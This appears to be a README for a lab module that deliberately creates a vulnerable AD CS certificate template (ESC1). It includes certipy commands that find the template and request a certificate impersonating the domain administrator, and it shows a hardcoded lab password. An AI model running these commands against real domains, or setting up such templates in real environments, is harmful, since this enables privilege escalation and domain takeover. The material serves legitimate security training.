# esc1

Creates and publishes certificate template `ESC1` on the CA host. Enrollee supplies the subject (SAN), client authentication EKU, enrollable by `Domain Users`. Template JSON: `ansible/roles/adcs_templates/files/ESC1.json` (referenced, not copied).

Attack:

    certipy find -u administrator@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout
    certipy req -u <user>@<domain> -p '<pass>' -ca <ca name> -template ESC1 -upn administrator@<domain>

Disable unpublishes (`Remove-CATemplate`) and removes the template (`Remove-ADCSTemplate`).
